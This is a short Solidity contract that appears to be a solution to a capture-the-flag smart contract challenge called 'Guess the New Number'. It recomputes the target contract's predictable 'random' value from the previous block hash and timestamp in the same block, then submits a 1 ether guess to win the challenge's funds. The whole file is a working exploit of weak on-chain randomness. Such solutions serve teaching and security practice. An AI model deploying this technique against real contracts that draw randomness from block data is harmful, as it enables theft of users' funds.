// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.4.21;

contract Guesser {
    GuessTheNewNumberChallenge challenge;

    function Guesser(address challenge_address) public payable {
        challenge = GuessTheNewNumberChallenge(challenge_address);
    }

    function answerTheChallenge() public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        challenge.guess.value(msg.value)(answer);
    }

    function() public payable { }
}